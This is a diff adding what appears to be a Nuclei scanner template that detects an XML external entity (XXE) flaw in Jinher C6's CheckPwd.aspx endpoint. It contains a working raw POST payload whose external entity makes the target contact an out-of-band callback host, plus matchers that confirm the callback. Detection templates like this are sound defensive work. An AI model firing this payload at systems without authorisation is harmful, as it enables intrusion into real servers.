@@ -1,0 +1,32 @@
+id: jinher-checkpwd-aspx-xxe
+info:
+  name: 金和C6 CheckPwd.aspx XML Entity Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: dnslog,xxe
+http:
+  - raw:
+      - |
+        POST /C6/JHSoft.Web.WorkFlat/CheckPwd.aspx/ HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/xml
+
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE root [ <!ENTITY % remote SYSTEM "https://{{interactsh-url}}"> %remote;]>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: regex
+        part: header
+        regex:
+          - "SessionId="
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
